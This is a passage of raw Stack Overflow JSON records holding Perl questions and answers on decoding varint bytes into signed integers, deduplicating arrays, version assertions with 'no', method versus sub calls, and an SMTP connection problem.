1577193096, "creation_date": 1577107360, "answer_id": 59456105, "question_id": 59455754, "link": "https://stackoverflow.com/questions/59455754/how-to-decode-hex-to-negative-integer-value-in-perl-part-2/59456105#59456105", "title": "How to decode hex to negative integer value in Perl (Part 2)", "body": "<pre><code>$num = unpack 'q', pack 'Q', $num;\n</code></pre>\n\n<p>is for 64-bit signed ints. For 32-bit values, you need to use</p>\n\n<pre><code>$num = unpack 'l', pack 'L', $num;\n</code></pre>\n\n<p>or</p>\n\n<pre><code>$num -= 2**32;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "is_accepted": false, "score": 1, "last_activity_date": 1577228788, "last_edit_date": 1577228788, "creation_date": 1577223774, "answer_id": 59473608, "question_id": 59455754, "link": "https://stackoverflow.com/questions/59455754/how-to-decode-hex-to-negative-integer-value-in-perl-part-2/59473608#59473608", "title": "How to decode hex to negative integer value in Perl (Part 2)", "body": "<p>Perhaps following code does the conversion to desired result</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse feature 'say';\n\nuse Data::Dumper;\n\nmy $debug = 0;\n\nwhile( my $num = &lt;DATA&gt; ) {\n    chomp $num;\n    say hex2dec($num);\n}\n\nsub hex2dec {\n    my $data = shift;\n\n    my $sign    = 0;\n    my $num     = 0;\n    my $bits;\n\n    my @data = reverse split ' ', $data;\n\n    $bits = 32 if scalar @data == 5;\n    $bits = 64 if scalar @data == 10;\n\n    map { $num = ($num &lt;&lt; 7)|h2i($_) } @data;\n\n    $sign = ($num &amp; (1&lt;&lt;($bits-1)) ) ? 1 : 0;\n\n    if( $debug ) {\n        say Dumper(\\@data);\n        say \"bits : $bits\";\n        say \"sign : $sign\";\n        say \"num  : $num\";\n        num2bin( $num,$bits);\n        num2bin(~$num,$bits);\n    }\n\n    if( $sign ) {\n        $num = -1 * ((1&lt;&lt;$bits) - $num) if $bits == 32;\n        $num = -1 * (~$num + 1)         if $bits == 64;\n    }\n\n    return $num;\n}\n\n# Hex byte to integer number\nsub h2i {\n    my $data = shift;\n\n    my $r = 0;\n    my %hex2dec;\n\n    @hex2dec{0..9,'A'..'F'} = 0..15; \n\n    map { $r &lt;&lt;= 4; $r += $hex2dec{$_} } split '', $data;\n\n    return $r&amp;0x7F;\n}\n\n# Print integer number as bin \nsub num2bin {\n    my $num = shift;\n    my $bit = shift;\n\n    my $bin;\n\n    while( $bit-- ) {\n        $bin .= $num &amp; (1&lt;&lt;$bit) ? '1' : '0';\n    }\n\n    say $bin;\n}\n\n=for comment\n\nB4 80 B5 FF 07 =  2146254900\nB5 80 B5 FF 07 =  2146254901\n\nA9 B4 E8 8C 08 = -2120607191\nAA B4 E8 8C 08 = -2120607190\n\nA1 E1 CE FD 0F = -5001055\n\nA3 86 8D 8E FC FF FF FF FF 01 = -1044167901\nA4 86 8D 8E FC FF FF FF FF 01 = -1044167900\n\n=cut\n\n__DATA__\nB4 80 B5 FF 07\nB5 80 B5 FF 07\nA9 B4 E8 8C 08\nAA B4 E8 8C 08\nA1 E1 CE FD 0F\nA3 86 8D 8E FC FF FF FF FF 01\nA4 86 8D 8E FC FF FF FF FF 01\n</code></pre>\n\n<p>output</p>\n\n<pre><code>2146254900\n2146254901\n-2120607191\n-2120607190\n-5001055\n-1044167901\n-1044167900\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "is_accepted": false, "score": 1, "last_activity_date": 1577243063, "last_edit_date": 1577243063, "creation_date": 1577237585, "answer_id": 59474559, "question_id": 59455754, "link": "https://stackoverflow.com/questions/59455754/how-to-decode-hex-to-negative-integer-value-in-perl-part-2/59474559#59474559", "title": "How to decode hex to negative integer value in Perl (Part 2)", "body": "<p>Other variation of the code</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse feature 'say';\n\nuse bytes;\n\nmy $debug = 1;\n\nmy @vars = ( \"\\xB4\\x80\\xB5\\xFF\\x07\",\n             \"\\xB5\\x80\\xB5\\xFF\\x07\",\n             \"\\xA9\\xB4\\xE8\\x8C\\x08\",\n             \"\\xAA\\xB4\\xE8\\x8C\\x08\",\n             \"\\xA1\\xE1\\xCE\\xFD\\x0F\",\n             \"\\xA3\\x86\\x8D\\x8E\\xFC\\xFF\\xFF\\xFF\\xFF\\x01\",\n             \"\\xA4\\x86\\x8D\\x8E\\xFC\\xFF\\xFF\\xFF\\xFF\\x01\"\n            );\n\nforeach my $v (@vars) {\n    say 'DATA   : ' \n        . decode($v)\n        . '  :: '\n        . unpack 'H'. bytes::length($v)*2, $v;\n}\n\nsub decode {\n    my $data = shift;\n\n    my $num = 0;\n    my $bits;\n    my $ret;\n\n    map { $num = ($num &lt;&lt; 7) | ($_ &amp; 0x7F) } reverse unpack 'C*', $data;\n\n    my $bytes = bytes::length($num);\n\n    $bits = 32 if $bytes == 10;\n    $bits = 64 if $bytes == 20;\n\n    my $sign = $num &amp; (1&lt;&lt;($bits-1)) ? 1 : 0;\n\n    if( $sign ) {\n        $ret = -1 * ((1&lt;&lt;$bits) - $num) if $bits == 32;\n        $ret = -1 * (~$num + 1)         if $bits == 64;\n    } else {\n        $ret = $num;\n    }\n\n    if( $debug ) {\n        say \"\\nDebug\\n\" . '-' x 20;\n        say \"data   : \" . unpack 'H'. $bytes, $data;\n        say \"bytes  : $bytes\";\n        say \"num    : $num (dec)\";\n        say \"bits   : $bits\";\n        say \"sign   : $sign\";\n        say \"hex    : \" . itoh($num);\n        say \"bin    : \" . num2bin( $num, $bits);\n        say \"~bin   : \" . num2bin(~$num, $bits);\n        say \"decode : $ret\";\n    }\n\n    return $ret;\n}\n\n# Print integer number as bin \nsub num2bin {\n    my $num = shift;\n    my $bit = shift;\n\n    my $bin;\n\n    while( $bit-- ) {\n        $bin .=  $num &amp; (1&lt;&lt;$bit) ? '1' : '0';\n    }\n\n    return $bin;\n}\n\n# Convert integer to ascii hex\nsub itoh {\n    my $data = shift;\n\n    my $hex;\n    my %hex;\n\n    @hex{0..15} = (0..9,'A'..'F');\n\n    while( $data ) {\n        my $n = $data &amp; 0xF;\n        $data &gt;&gt;= 4;\n        $hex .= $hex{$n};\n    }\n\n    return reverse $hex;\n}\n</code></pre>\n\n<p>output</p>\n\n<pre><code>Debug\n--------------------\ndata   : b480b5ff07\nbytes  : 10\nnum    : 2146254900 (dec)\nbits   : 32\nsign   : 0\nhex    : 7FED4034\nbin    : 01111111111011010100000000110100\n~bin   : 10000000000100101011111111001011\ndecode : 2146254900\nDATA   : 2146254900  :: b480b5ff07\n\nDebug\n--------------------\ndata   : b580b5ff07\nbytes  : 10\nnum    : 2146254901 (dec)\nbits   : 32\nsign   : 0\nhex    : 7FED4035\nbin    : 01111111111011010100000000110101\n~bin   : 10000000000100101011111111001010\ndecode : 2146254901\nDATA   : 2146254901  :: b580b5ff07\n\nDebug\n--------------------\ndata   : a9b4e88c08\nbytes  : 10\nnum    : 2174360105 (dec)\nbits   : 32\nsign   : 1\nhex    : 819A1A29\nbin    : 10000001100110100001101000101001\n~bin   : 01111110011001011110010111010110\ndecode : -2120607191\nDATA   : -2120607191  :: a9b4e88c08\n\nDebug\n--------------------\ndata   : aab4e88c08\nbytes  : 10\nnum    : 2174360106 (dec)\nbits   : 32\nsign   : 1\nhex    : 819A1A2A\nbin    : 10000001100110100001101000101010\n~bin   : 01111110011001011110010111010101\ndecode : -2120607190\nDATA   : -2120607190  :: aab4e88c08\n\nDebug\n--------------------\ndata   : a1e1cefd0f\nbytes  : 10\nnum    : 4289966241 (dec)\nbits   : 32\nsign   : 1\nhex    : FFB3B0A1\nbin    : 11111111101100111011000010100001\n~bin   : 00000000010011000100111101011110\ndecode : -5001055\nDATA   : -5001055  :: a1e1cefd0f\n\nDebug\n--------------------\ndata   : a3868d8efcffffffff01\nbytes  : 20\nnum    : 18446744072665383715 (dec)\nbits   : 64\nsign   : 1\nhex    : FFFFFFFFC1C34323\nbin    : 1111111111111111111111111111111111000001110000110100001100100011\n~bin   : 0000000000000000000000000000000000111110001111001011110011011100\ndecode : -1044167901\nDATA   : -1044167901  :: a3868d8efcffffffff01\n\nDebug\n--------------------\ndata   : a4868d8efcffffffff01\nbytes  : 20\nnum    : 18446744072665383716 (dec)\nbits   : 64\nsign   : 1\nhex    : FFFFFFFFC1C34324\nbin    : 1111111111111111111111111111111111000001110000110100001100100100\n~bin   : 0000000000000000000000000000000000111110001111001011110011011011\ndecode : -1044167900\nDATA   : -1044167900  :: a4868d8efcffffffff01\n</code></pre>\n"}], "owner": {"reputation": 101, "user_id": 2787859, "user_type": "registered", "profile_image": "https://graph.facebook.com/100004041835408/picture?type=large", "display_name": "\u0e15\u0e49\u0e2d\u0e07 \u0e40\u0e2d\u0e01\u0e21\u0e31\u0e22", "link": "https://stackoverflow.com/users/2787859/%e0%b8%95%e0%b9%89%e0%b8%ad%e0%b8%87-%e0%b9%80%e0%b8%ad%e0%b8%81%e0%b8%a1%e0%b8%b1%e0%b8%a2"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 93, "favorite_count": 2, "accepted_answer_id": 59456105, "answer_count": 3, "score": 1, "last_activity_date": 1577243063, "creation_date": 1577105695, "question_id": 59455754, "link": "https://stackoverflow.com/questions/59455754/how-to-decode-hex-to-negative-integer-value-in-perl-part-2", "title": "How to decode hex to negative integer value in Perl (Part 2)", "body": "<p>I have problem with negative integer values in hex format. My job have 2 formats as in the example below:</p>\n\n<pre><code>###########################################################################\n\n=for comment\n\nB4 80 B5 FF 07 =  2146254900\nB5 80 B5 FF 07 =  2146254901\n\nA9 B4 E8 8C 08 = -2120607191\nAA B4 E8 8C 08 = -2120607190\n\nA3 86 8D 8E FC FF FF FF FF 01 = -1044167901\nA4 86 8D 8E FC FF FF FF FF 01 = -1044167900\n\n=cut\n\n###########################################################################\n\n$vars[0] = \"\\xB4\\x80\\xB5\\xFF\\x07\";\n$vars[1] = \"\\xB5\\x80\\xB5\\xFF\\x07\";\n$vars[2] = \"\\xA9\\xB4\\xE8\\x8C\\x08\";\n$vars[3] = \"\\xAA\\xB4\\xE8\\x8C\\x08\";\n$vars[4] = \"\\xA3\\x86\\x8D\\x8E\\xFC\\xFF\\xFF\\xFF\\xFF\\x01\";\n$vars[5] = \"\\xA4\\x86\\x8D\\x8E\\xFC\\xFF\\xFF\\xFF\\xFF\\x01\";\n\n###########################################################################\n\nfor my $var (@vars)\n{\n    print decodeInt($var) . \"\\n\";\n}\n\n###########################################################################\n\nsub decodeInt\n{\n    $_[0] =~ s/^([\\x80-\\xFF]*[\\x00-\\x7F])// or return;\n\n    my $encoded_num = $1;\n    my $num = 0;\n\n    for ( reverse unpack 'C*', $encoded_num )\n    {\n        $num = ( $num &lt;&lt; 7 ) | ( $_ &amp; 0x7F );\n    }\n\n    $num = unpack 'q', pack 'Q', $num;  #Cast two unsigned complement Ints back to 64-bit signed\n\n    return $num;\n}\n\n##########################################################################\n</code></pre>\n\n<p>Previously, the above code is work very well. But now I have the new format of negative integer values that don't work.</p>\n\n<pre><code>A9 B4 E8 8C 08 = -2120607191\nAA B4 E8 8C 08 = -2120607190\n</code></pre>\n\n<p>My code decoded to 2174360105 and 2174360106.</p>\n"}, {"tags": ["arrays", "perl", "split", "numbers", "uniq"], "answers": [{"comments": [{"owner": {"reputation": 95, "user_id": 7225696, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/88e1f7762ddba8483ef31843a1f92dfc?s=128&d=identicon&r=PG&f=1", "display_name": "Vinodini Natrajan", "link": "https://stackoverflow.com/users/7225696/vinodini-natrajan"}, "edited": false, "score": 0, "creation_date": 1577107670, "post_id": 59456152, "comment_id": 105093428, "body": "Required output array with 4 elements 100, 200, 300, 400"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 3, "last_activity_date": 1577107767, "last_edit_date": 1577107767, "creation_date": 1577107549, "answer_id": 59456152, "question_id": 59455613, "link": "https://stackoverflow.com/questions/59455613/perl-array-unique-elements/59456152#59456152", "title": "Perl array unique elements", "body": "<p>First create a list of what you want to make unique,</p>\n\n<pre><code>map { split } @uncurled_data\n</code></pre>\n\n<p>Then use the standard ways of finding the unique items.</p>\n\n<pre><code>use List::Util qw( uniq );\nmy @uniq = uniq map { split } @uncurled_data;\n</code></pre>\n\n<p>or</p>\n\n<pre><code>my %seen;\nmy @uniq = grep { !$seen{$_}++ } map { split } @uncurled_data;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1702, "user_id": 880797, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/bace3dcc4a83523d93399ab2bd1f3728?s=128&d=identicon&r=PG", "display_name": "Andrey", "link": "https://stackoverflow.com/users/880797/andrey"}, "is_accepted": false, "score": 0, "last_activity_date": 1577136538, "creation_date": 1577136538, "answer_id": 59461494, "question_id": 59455613, "link": "https://stackoverflow.com/questions/59455613/perl-array-unique-elements/59461494#59461494", "title": "Perl array unique elements", "body": "<p>You can also do it this way:</p>\n\n<pre><code>my @uniq = sort keys %{+{map {$_ =&gt; 1;} map { split } @uncurled_data}};\n</code></pre>\n"}], "owner": {"reputation": 95, "user_id": 7225696, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/88e1f7762ddba8483ef31843a1f92dfc?s=128&d=identicon&r=PG&f=1", "display_name": "Vinodini Natrajan", "link": "https://stackoverflow.com/users/7225696/vinodini-natrajan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 0, "accepted_answer_id": 59456152, "answer_count": 2, "score": 1, "last_activity_date": 1577136538, "creation_date": 1577105107, "last_edit_date": 1577107646, "question_id": 59455613, "link": "https://stackoverflow.com/questions/59455613/perl-array-unique-elements", "title": "Perl array unique elements", "body": "<p>I have a perl array like below and I have to extract the unique elements of this array. Is there an easy way to do this ?</p>\n\n<pre><code>Perl&gt; print(Dumper(@uncurled_data))\n$VAR1 = '100 200';\n$VAR2 = '100 200';\n$VAR3 = '300 400';\n$VAR4 = '100 200';\n$VAR5 = '100 200';\n$VAR6 = '300 400';\n$VAR7 = '300 400';\n$VAR8 = '300 400';\n</code></pre>\n\n<p>When I do this, <code>keys { map { (split /\\ /, $_)[0] =&gt; 1 } @uncurled_data }</code>, I'll have to do it twice ie, once for each element in the array. Is there any one/liner or simple way to do this ?</p>\n\n<p>Desired output array with 4 elements <code>100, 200, 300, 400</code></p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 1, "creation_date": 1577114622, "post_id": 59455081, "comment_id": 105096489, "body": "As an aside, these sort of checks are a fool&#39;s errand. It is similar to the problem with declaring &quot;conflicts&quot; in the prerequisites of a CPAN module. CPAN clients are not package managers, and so there is nothing keeping the newer version from getting installed when something else needs it. If you need version pinning or restriction, you have to use something like <a href=\"https://metacpan.org/pod/Carton\" rel=\"nofollow noreferrer\">Carton</a> or use a package manager like RPM."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1577118007, "post_id": 59455081, "comment_id": 105097893, "body": "Also small nitpick: you should use <code>Encode-&gt;VERSION</code> to get the version rather than reading <code>$Encode::VERSION</code> directly."}], "answers": [{"comments": [{"owner": {"reputation": 2749, "user_id": 482519, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ff5fbaf09cb6d70cefb999871591b3de?s=128&d=identicon&r=PG", "display_name": "ernix", "link": "https://stackoverflow.com/users/482519/ernix"}, "edited": false, "score": 0, "creation_date": 1577116653, "post_id": 59456434, "comment_id": 105097328, "body": "The last example just made sense to me. Thanks"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 1, "last_activity_date": 1577108814, "creation_date": 1577108814, "answer_id": 59456434, "question_id": 59455081, "link": "https://stackoverflow.com/questions/59455081/assert-when-module-version-is-too-modern/59456434#59456434", "title": "Assert when module version is too modern", "body": "<p><code>no</code> performs the same check as <code>use</code>. </p>\n\n<p>For example, if you wanted to disable autovivification, and you needed one of the fixes in version 0.18 of the module, you'd use</p>\n\n<pre><code>no autovivification 0.18;\n</code></pre>\n\n<p>As such, you must indeed add your own check as you showed.</p>\n\n<hr>\n\n<p>Specifically, </p>\n\n<pre><code>use Module v2.80;\n</code></pre>\n\n<p>is equivalent to </p>\n\n<pre><code>BEGIN {\n   require Module;\n   Module-&gt;VERSION(v2.80);  # Make sure &gt;= v2.80\n   Module-&gt;import();\n}\n</code></pre>\n\n<p>while</p>\n\n<pre><code>no Module v2.80;\n</code></pre>\n\n<p>is equivalent to </p>\n\n<pre><code>BEGIN {\n   require Module;\n   Module-&gt;VERSION(v2.80);  # Make sure &gt;= v2.80\n   Module-&gt;unimport();\n}\n</code></pre>\n"}], "owner": {"reputation": 2749, "user_id": 482519, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ff5fbaf09cb6d70cefb999871591b3de?s=128&d=identicon&r=PG", "display_name": "ernix", "link": "https://stackoverflow.com/users/482519/ernix"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 36, "favorite_count": 0, "accepted_answer_id": 59456434, "answer_count": 1, "score": 1, "last_activity_date": 1577108814, "creation_date": 1577102739, "question_id": 59455081, "link": "https://stackoverflow.com/questions/59455081/assert-when-module-version-is-too-modern", "title": "Assert when module version is too modern", "body": "<p>How to assert if the script is using too-modern version of modules?</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nuse Encode;\nuse version;\n\n# no v5.00;         # Works as I expected\n# no Encode v2.80;  # But this doesn't work\n\n# What I want to do is:\nBEGIN {\n    my $current = version-&gt;parse($Encode::VERSION);\n    my $fatal = version-&gt;parse('v2.80');\n    if ($current &gt;= $fatal) {\n        die \"Encode.pm since $fatal too modern--this is $current\";\n    }\n}\n</code></pre>\n\n<p>It seems like I can use function <code>no</code>, to restrict module version.  But no luck.</p>\n\n<p><a href=\"https://perldoc.perl.org/functions/no.html\" rel=\"nofollow noreferrer\">https://perldoc.perl.org/functions/no.html</a></p>\n\n<blockquote>\n  <p>no MODULE VERSION </p>\n</blockquote>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 13167, "user_id": 546205, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/5d7dd187ae1f4400664cbc0e66c8a2ce?s=128&d=identicon&r=PG", "display_name": "Miguel Prz", "link": "https://stackoverflow.com/users/546205/miguel-prz"}, "edited": false, "score": 1, "creation_date": 1577099390, "post_id": 59453648, "comment_id": 105090043, "body": "It&#39;s a good idea read the official documentation: <a href=\"https://perldoc.perl.org/perlmod.html\" rel=\"nofollow noreferrer\">perldoc.perl.org/perlmod.html</a>"}, {"owner": {"reputation": 3472, "user_id": 4990392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89acc35f0339a9c7e6ae36443a23e2d9?s=128&d=identicon&r=PG&f=1", "display_name": "Dada", "link": "https://stackoverflow.com/users/4990392/dada"}, "reply_to_user": {"reputation": 13167, "user_id": 546205, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/5d7dd187ae1f4400664cbc0e66c8a2ce?s=128&d=identicon&r=PG", "display_name": "Miguel Prz", "link": "https://stackoverflow.com/users/546205/miguel-prz"}, "edited": false, "score": 1, "creation_date": 1577100571, "post_id": 59453648, "comment_id": 105090484, "body": "@MiguelPrz The documentation can be quite intimidating for a beginner. Since I am experienced, I knew to open perlop (to find <code>-&gt;</code>), which lead me to perlobj. It&#39;s easy for someone who knows the answer to say &quot;rtfm&quot;, but much harder for a beginner to find where/what the relevant documentations are (especially in that case since the answer is split in perlmod and perobj)."}, {"owner": {"reputation": 51391, "user_id": 132382, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/20fc7ee8f405aa42e36eb73e841e5a36?s=128&d=identicon&r=PG", "display_name": "pilcrow", "link": "https://stackoverflow.com/users/132382/pilcrow"}, "reply_to_user": {"reputation": 3472, "user_id": 4990392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89acc35f0339a9c7e6ae36443a23e2d9?s=128&d=identicon&r=PG&f=1", "display_name": "Dada", "link": "https://stackoverflow.com/users/4990392/dada"}, "edited": false, "score": 0, "creation_date": 1577118647, "post_id": 59453648, "comment_id": 105098210, "body": "@dada and OP, a great place to begin, which is mentioned in the first line of <code>perlobj</code>, is the tutorial <a href=\"https://perldoc.perl.org/perlootut.html\" rel=\"nofollow noreferrer\"><code>perlootut</code></a>."}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 6, "last_activity_date": 1577108199, "creation_date": 1577108199, "answer_id": 59456299, "question_id": 59453648, "link": "https://stackoverflow.com/questions/59453648/difference-between-double-colon-and-arrow-in-perl/59456299#59456299", "title": "Difference between double colon and arrow in perl", "body": "<p><code>Foo-&gt;bar()</code> is a method call.</p>\n\n<ul>\n<li>It will use inheritance if necessary.</li>\n<li><p>It will pass the invocant (the left side of <code>-&gt;</code>) as the first argument. As such, <code>bar</code> should be written as follows:</p>\n\n<pre><code># Class method (Foo-&gt;bar)\nsub bar {\n   my ($class, ...) = @_;\n}\n</code></pre>\n\n<p>or</p>\n\n<pre><code># Object method (my $foo = Foo-&gt;new; $foo-&gt;bar)\nsub bar {\n   my ($self, ...) = @_;\n}\n</code></pre></li>\n</ul>\n\n<p><code>Foo::bar()</code> is a sub call.</p>\n\n<ul>\n<li>It won't use inheritance.</li>\n</ul>\n"}], "owner": {"reputation": 609, "user_id": 11143545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/617c9145bb039f1defedce54b28e89b3?s=128&d=identicon&r=PG&f=1", "display_name": "Herdsman", "link": "https://stackoverflow.com/users/11143545/herdsman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 357, "favorite_count": 0, "accepted_answer_id": 59456299, "answer_count": 1, "score": 2, "last_activity_date": 1577108199, "creation_date": 1577096646, "last_edit_date": 1577100172, "question_id": 59453648, "link": "https://stackoverflow.com/questions/59453648/difference-between-double-colon-and-arrow-in-perl", "title": "Difference between double colon and arrow in perl", "body": "<p>If it is duplicate, say so. I Have not found it, only for PHP but for Perl. So If I can write full name of e.g. <code>Class::sub()</code> or <code>$Class::scalar</code>, I can write <code>Class-&gt;sub</code> or <code>$Class-&gt;scalar</code>(in case I have <code>use</code>d or <code>require</code>d the <code>Class</code>), what is the main difference in perl? </p>\n\n<p>The problem is:\nClass Animal.pm:</p>\n\n<pre><code>#!/usr/bin/perl -w\npackage Animal;\nour $VERSION = '0.01';\nsub speak {\n    my $class = shift;\n    print \"a $class goes \", $class-&gt;sound;\n}\nsub sound{\n    die \"You have to defined sound() in a subclass\";\n}\n</code></pre>\n\n<p>Then Class Horse.pm:</p>\n\n<pre><code>#!/usr/bin/perl -w\npackage Horse;\nuse Animal;\nour @ISA = qw[Animal];\nour $VERSION = '0.01';\nsub sound { 'neight' }\n1\n</code></pre>\n\n<p>And if I, in main program do this:</p>\n\n<pre><code>#!/usr/bin/perl -w\nBEGIN{ unshift @INC, 'dirWithModules' }\n use Horse; use Animal;use Cow;\nAnimal::speak('Horse');\n</code></pre>\n\n<p>output----><code>\"a Horse goes neight\"</code>\nBUT IF I OD </p>\n\n<pre><code>#!/usr/bin/perl -w\nBEGIN{ unshift @INC, 'dirWithModules' }\n use Horse; use Animal;use Cow;\nAnimal-&gt;speak('Horse')\n</code></pre>\n\n<p>output---><code>\"You have to defined sound() in a subclass at Animal.pm\"</code></p>\n\n<p>So my question is, If I reference my method from class <code>Horse.pm</code> iherited sub <code>speak</code> from <code>Animal.pm</code> with <code>::</code>, double colon, the NO PROBLEM - it will print the sound. However if I try to reference the sub with <code>-&gt;</code> arrow, The <code>$class</code> is not inherited - that is, <code>$class</code> is <code>Animal.pm</code> itself, but not as parameter sent (<code>'Horse'</code>). So In what is <code>::</code> and <code>-&gt;</code> different?</p>\n"}, {"tags": ["perl", "email", "smtp"], "comments": [{"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1577041324, "post_id": 59447106, "comment_id": 105077055, "body": "Please include <code>$!</code> and <code>$IO::Socket::SSL::SSL_ERROR</code> in your <code>print &quot;smtp failed&lt;br&gt;&quot;</code> to get details of the error. And since you<code>ve already used </code>Debug` please include the actual debug output in your question. Also <code>SSL =&gt;1</code> makes only sense with port 465, for ports 25 and 587 you need to use <code>$smtp-&gt;starttls()</code> instead."}, {"owner": {"reputation": 21, "user_id": 12476022, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cf9c670879bda154c4a0511859ba17b6?s=128&d=identicon&r=PG&f=1", "display_name": "jobeSW", "link": "https://stackoverflow.com/users/12476022/jobesw"}, "reply_to_user": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1577044212, "post_id": 59447106, "comment_id": 105077653, "body": "Updated my post with your suggestion, port 25 without ssl times out, [A connection attempt failed because the connected party did not properly respond] on both servers.   unsure how to use starttls, what args do i () into this?"}, {"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1577044620, "post_id": 59447106, "comment_id": 105077753, "body": "<i>&quot;port 25 without ssl times out,...&quot;</i> - this suggests that either there is no service on this port on the target host or that your connection is blocked by a firewall (which seems to be not unusual in GoDaddy setups to prevent spammers). If the initial connection already fails <code>starttls</code> will not help. As to how to use <code>starttls</code> please refer to the documentation of Net::SMTP."}, {"owner": {"reputation": 21, "user_id": 12476022, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cf9c670879bda154c4a0511859ba17b6?s=128&d=identicon&r=PG&f=1", "display_name": "jobeSW", "link": "https://stackoverflow.com/users/12476022/jobesw"}, "reply_to_user": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1577045870, "post_id": 59447106, "comment_id": 105078040, "body": "thanks, i skimmed IO::Socket::SSL docs so i think i understand starttls a bit better.  On port 465 with ssl=&gt;1 i get $![Bad file descriptor] i&#39;m guessing that&#39;s a problem with the initial object setup?"}, {"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1577049464, "post_id": 59447106, "comment_id": 105078767, "body": "Yes, I would say that the initial TCP connection fails already."}], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 12476022, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cf9c670879bda154c4a0511859ba17b6?s=128&d=identicon&r=PG&f=1", "display_name": "jobeSW", "link": "https://stackoverflow.com/users/12476022/jobesw"}, "edited": false, "score": 0, "creation_date": 1577102030, "post_id": 59450186, "comment_id": 105090997, "body": "I don&#39;t have Authen::SASL, but i installed it on my local XAMPP server to try your code, I&#39;m not getting anything, no [Trying to authenticate..] and no [Initialization failed:], and no email."}, {"owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "reply_to_user": {"reputation": 21, "user_id": 12476022, "user_type": "registered", "profile_image": 